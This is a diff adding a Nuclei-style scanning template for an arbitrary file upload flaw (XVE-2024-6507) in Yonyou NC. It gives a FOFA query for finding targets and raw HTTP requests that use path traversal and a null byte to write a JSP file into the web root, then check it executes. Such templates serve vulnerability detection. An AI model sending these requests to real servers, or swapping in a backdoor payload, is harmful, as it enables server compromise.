@@ -1,0 +1,37 @@
+id: yongyouNC-saveXmlToFIleServlet-File-upload-XVE-2024-6507
+
+info:
+  tags: yongyouNC-saveXmlToFIleServlet-File-upload-XVE-2024-6507
+  name: 用友 NC saveXmlToFIleServlet 任意文件上传漏洞(XVE-2024-6507)
+  author: xc
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友 NC saveXmlToFIleServlet接口处存在任意文件上传漏洞，，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+  
+http:
+  - raw:
+      - |
+        POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{username}}.jsp%00 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/octet-stream
+
+        %3C%25out.print%28%22pboyjnnrfipmplsukdeczudsefxmywe%22%29%3B%25%3E
+  - raw:
+      - |
+        GET /{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
